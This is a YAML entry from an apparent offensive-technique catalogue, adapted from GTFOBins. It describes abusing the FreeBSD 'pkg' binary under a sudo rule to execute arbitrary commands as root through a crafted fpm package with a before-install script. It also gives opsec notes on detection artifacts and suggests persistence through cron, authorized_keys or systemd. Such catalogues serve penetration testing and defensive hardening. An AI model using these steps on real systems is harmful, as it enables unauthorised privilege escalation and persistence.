---
name: pkg
capabilities:
- exec
required_permissions:
  level: sudo
  notes: Requires sudo rule for this binary.
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: command
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: pkg install -y --no-repo-update ./x-1.0.txz
  notes: |-
    Generate the FreeBSD package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.

    ```
    echo /path/to/command >x.sh
    fpm -n x -s dir -t freebsd -a all --before-install x.sh .
    ```
references:
- https://gtfobins.github.io/gtfobins/pkg/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
